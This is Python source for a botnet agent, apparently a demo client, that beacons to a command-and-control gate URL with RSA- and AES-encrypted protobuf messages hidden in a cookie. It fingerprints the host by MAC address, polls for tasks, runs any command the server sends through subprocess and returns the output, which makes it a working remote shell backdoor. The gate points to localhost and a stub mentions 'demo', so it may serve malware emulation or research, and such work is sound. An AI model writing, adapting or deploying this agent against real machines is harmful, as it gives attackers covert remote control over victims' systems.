from __future__ import print_function

import os
import base64
import subprocess
import hashlib
import threading
from uuid import getnode
from time import sleep


from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA

import requests
import message_pb2 as message

GATE_URL = "http://127.0.0.1:8000/gate.html"
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqqKav9bmrSMSPwnxA3ul
IleTPGiL9LGtdROute8ncU0HzPyLSl4Ib9hMYwUHjI/HyHA92sJRXoc8i/53zsgg
9XuizhU6O04wvafBLQyqMywms4awq3cIbdNtQop4CZWpnqnM3zdE8HU/t8eOVkCw
62Kqb2AKDoAxrYEm0JT3xfAF/SZYD4LRMDumFW4/wMAa4NW3kCLLPGzYHq2/5tcs
d9RhQuk9buitFaG1PXBkt6xrLeKz7QHz4snxaiDDwXgGPve2U8/XhlbX/wmx0zPb
oePAU+BvWARyAGKFYBNDwHnO+8LpBDCRZZxwkLyfFOaG/KE1edN9+jwYFFHLcMjx
OwIDAQAB
-----END PUBLIC KEY-----"""

# Returns ranom key and iv for AES CBC
def get_random_key_and_iv():
    return (get_random_bytes(16), get_random_bytes(16))

# Bot id is sha1(hw address)
def geneate_bot_id():
    return hashlib.sha1(hex(getnode()).encode("utf-8")).hexdigest()

# Pad with \x00s
def pad(msg):
    return msg + (16 - len(msg) % 16) * b"\x00"

# Unpad \x00s
def unpad(msg):
    while (msg[-1] == 0):
        msg = msg[:-1]
    return msg

def encrypt_aes(data, key, iv):
    return AES.new(key=key, mode=AES.MODE_CBC, iv=iv).encrypt(pad(data))

def decrypt_aes(data, key, iv):
    return unpad(AES.new(key=key, mode=AES.MODE_CBC, iv=iv).decrypt(data))

def package_aes_key(key, iv):
    return rsa_cipher.encrypt(key+iv)

def envelope(msg_id=12, data=b""):
    return message.Envelope(messageId=msg_id, message=data.SerializeToString()).SerializeToString()

def unenvelope(data):
    envelope = message.Envelope()
    envelope.ParseFromString(data)
    return envelope

def pack(data, key, iv):
    return base64.b64encode(package_aes_key(key, iv) + encrypt_aes(data, key, iv)).decode('utf-8')

def unpack(data, key, iv):
    return decrypt_aes(base64.b64decode(data), key, iv)

def wire(msg_id, data):
    print("[+] Sending messageId: {}".format(msg_id))
    key, iv = get_random_key_and_iv()
    packed_msg = pack(envelope(msg_id, data), key, iv)
    r = requests.get(url=GATE_URL, cookies={"id":packed_msg})
    return unenvelope(unpack(r.text, key, iv))


class Agent:
    def __init__(self, call_delay = 5, knock_id = 1):
        self.knock_id = knock_id
        self.call_delay = call_delay # (s)
        self.bot_id = geneate_bot_id()
        self.current_taskId = 15 # register
        self.current_taskData = ""

    def hander(self):
        if self.current_taskId == 16:
            wire_response = wire(17, self.shell_event())
        else:
            wire_response = wire(15, self.knock_event()) # default is knock
        self.parse_response(wire_response)
        self.knock_id += 1
        sleep(self.call_delay)

    def parse_response(self, wire_response):
        print("[+] Received messageId: {}".format(wire_response.messageId))
        if wire_response.messageId == 16:
            task = message.Task()
            task.ParseFromString(wire_response.message)
            print("[+] Received taskId: {}".format(task.taskId))
            self.current_taskId = task.taskId
            self.current_taskData = task.task
            print(task)
        else:
            pass

    def knock_event(self):
        return message.Knock(botId=self.bot_id, knockId=self.knock_id)

    def shell_event(self):
        return message.TaskResponse(botId=self.bot_id, knockId=self.knock_id, taskId=16, task=subprocess.getoutput(self.current_taskData))

    def registration_event(self):
        return message.RegistrationRequest(
            botId=self.bot_id,
            processList="Process List is empty in demo",
            OS="Windows XP"
            )


def main():
    # Import public key
    public_key = RSA.importKey(RSA_PUBLIC_KEY)

    # Create an instance of PKCS1_OAEP cipher
    global rsa_cipher 
    rsa_cipher = PKCS1_OAEP.new(public_key)

    # Init agent
    agent = Agent()
    try:
        while True:
            agent.hander()
    except KeyboardInterrupt:
        print("Exiting")
        exit()


if __name__ == '__main__':
    main()

